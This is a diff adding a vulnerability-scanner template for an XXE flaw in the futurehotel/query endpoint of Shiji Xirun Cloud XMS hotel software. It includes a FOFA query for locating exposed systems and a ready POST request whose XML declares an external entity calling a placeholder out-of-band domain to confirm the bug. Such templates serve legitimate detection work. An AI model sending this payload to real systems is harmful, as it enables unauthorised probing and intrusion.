@@ -1,0 +1,28 @@
+## id: VEID-2024-0305
+## name: 西软云XMS-futurehotel-query接口存在XXE漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,xxe,veid2024
+## description: XMS存在XXE漏洞
+## fofa-query: app="shiji-西软云XMS"
+## verification: true
+
+
+POST /XopServerRS/rest/futurehotel/query HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Connection: close
+Content-Type: text/xml
+Accept-Encoding: gzip
+
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{oob_domain}}"> %remote;]>
+
+
+#@ oob: dns
+#@ matcher: oob_received == true
+
+
+
+
+
+# @VEIL-STAMP: 28abae9d8f328b4fa1e523e1b8bc71bdc6412137a29c8839796da911d54797e0
